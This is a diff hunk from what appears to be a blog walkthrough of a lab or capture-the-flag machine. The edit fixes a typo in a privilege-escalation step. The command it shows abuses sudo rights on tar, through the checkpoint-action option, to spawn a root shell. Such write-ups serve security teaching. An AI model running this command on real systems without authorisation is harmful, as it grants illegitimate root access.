@@ -130,7 +130,7 @@ We can see that we have the ability to escalate our privilege and commands as ro
 Lets run the command below
 
 {% highlight bash %}
-:$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
 {% endhighlight bash %}
 
 Afer running the command above we can now see that we are the root user by running the command below
